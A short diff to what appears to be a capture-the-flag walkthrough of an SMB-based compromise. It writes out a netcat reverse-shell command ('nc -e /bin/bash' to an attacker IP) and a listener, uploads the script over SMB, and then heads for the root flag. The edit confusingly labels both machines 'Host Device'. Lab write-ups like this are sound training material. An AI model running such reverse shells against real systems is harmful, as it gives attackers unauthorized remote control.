@@ -59,13 +59,13 @@ s1. Enumeration: (Network Scan)
 
     cat smb.conf
 
-7. Connect VIA nc
+7. Connect VIA nc 
 
-    A. Target Device
+    A. Host Device
 
           echo "nc -e /bin/bash 10.10.1.50 5555" > smbscipt.sh
 
-    B. Receiving Device
+    B. Host Device
 
           sudo nc -nvlp 5555
 
@@ -73,7 +73,7 @@ s1. Enumeration: (Network Scan)
 
           put smbscript.sh
 
-          launches connection to receiving device via netcat
+          Connects to host
 
 8. Find root flag
 
